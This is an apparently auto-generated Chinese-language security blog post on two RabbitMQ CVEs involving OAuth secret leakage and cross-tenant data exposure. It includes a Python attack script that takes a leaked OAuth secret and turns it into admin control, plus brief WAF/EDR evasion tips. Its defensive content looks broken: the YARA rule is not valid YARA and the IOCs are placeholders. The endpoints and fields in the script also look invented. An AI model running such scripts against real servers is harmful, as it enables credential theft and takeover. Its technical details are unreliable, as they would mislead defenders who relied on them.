---
layout: post
title:  "RabbitMQ Flaws Could Leak OAuth Secrets and Expose Cross-Tenant Queue Metadata"
date:   2026-07-14 19:07:58 +0000
categories: [security]
severity: high
---

# 🔥 解析 RabbitMQ 存取控制漏洞：OAuth 秘密洩露與租戶邊界繞過

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：8.7 和 5.3)
> * **受駭指標**: Info Leak 和租戶邊界繞過
> * **關鍵技術**: OAuth、存取控制、租戶邊界

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: RabbitMQ 的存取控制機制中存在兩個漏洞：CVE-2026-57219 和 CVE-2026-57221。CVE-2026-57219 是因為一個過時的 HTTP API 端點 (`GET /api/auth`) 導致 OAuth 秘密洩露，而 CVE-2026-57221 是因為缺乏適當的授權機制，允許任何已登入的用戶讀取其他租戶的數據。
* **攻擊流程圖解**:
  1. 攻擊者發送 `GET /api/auth` 請求到 RabbitMQ 服務器。
  2. 服務器返回包含 OAuth 秘密的回應。
  3. 攻擊者使用洩露的 OAuth 秘密換取管理員令牌。
  4. 攻擊者使用管理員令牌控制 RabbitMQ 服務器。
* **受影響元件**: RabbitMQ 3.13.0 及後續版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要能夠發送 HTTP 請求到 RabbitMQ 服務器。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 發送 GET /api/auth 請求
    response = requests.get('http://example.com/api/auth')
    
    # 提取 OAuth 秘密
    oauth_secret = response.json()['oauth_secret']
    
    # 使用洩露的 OAuth 秘密換取管理員令牌
    token_response = requests.post('http://example.com/api/token', headers={'Authorization': f'Bearer {oauth_secret}'})
    
    # 使用管理員令牌控制 RabbitMQ 服務器
    management_response = requests.get('http://example.com/api/management', headers={'Authorization': f'Bearer {token_response.json()["token"]}'})
    
    print(management_response.json())
    
    ```
* **繞過技術**: 如果 WAF 或 EDR 存在，攻擊者可能需要使用其他技術來繞過，例如使用不同的 HTTP 方法或添加無害的請求頭。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.com | /api/auth |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule rabbitmq_oauth_leak {
      meta:
        description = "Detect RabbitMQ OAuth secret leak"
        author = "Your Name"
      strings:
        $oauth_secret = "oauth_secret" wide
      condition:
        $oauth_secret in (http.request.body | http.response.body)
    }
    
    ```
* **緩解措施**: 更新 RabbitMQ 到最新版本，旋轉 OAuth 秘密，限制存取管理界面，分離租戶，並實施防火牆規則來阻止存取漏洞端點。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **OAuth (授權)**: OAuth 是一個授權框架，允許用戶授權第三方應用程式存取其資源，而無需分享密碼。
* **租戶邊界 (Tenant Boundary)**: 租戶邊界是指多租戶系統中不同租戶之間的邏輯隔離。
* **存取控制 (Access Control)**: 存取控制是指系統中控制用戶存取資源的機制。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/rabbitmq-flaws-could-leak-oauth-secrets.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


